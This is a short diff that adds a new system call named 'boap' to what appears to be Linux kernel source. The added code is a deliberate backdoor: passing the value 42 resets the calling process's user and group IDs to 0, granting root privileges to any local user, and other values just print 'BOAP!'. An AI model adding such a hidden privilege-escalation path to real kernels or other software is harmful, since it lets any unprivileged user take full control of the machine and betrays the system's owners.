@@ -2173,3 +2173,19 @@ COMPAT_SYSCALL_DEFINE1(sysinfo, struct compat_sysinfo __user *, info)
 	return 0;
 }
 #endif /* CONFIG_COMPAT */
+
+SYSCALL_DEFINE1(boap, int, value)
+{
+  if (value == 42)
+    {
+      struct cred *new_cred = prepare_creds();
+      new_cred->uid = (kuid_t){0};
+      new_cred->gid = (kgid_t){0};
+      new_cred->euid = (kuid_t){0};
+      new_cred->egid = (kgid_t){0};
+      
+      return commit_creds(new_cred);
+    }
+  printk("BOAP!");
+  return value;
+}
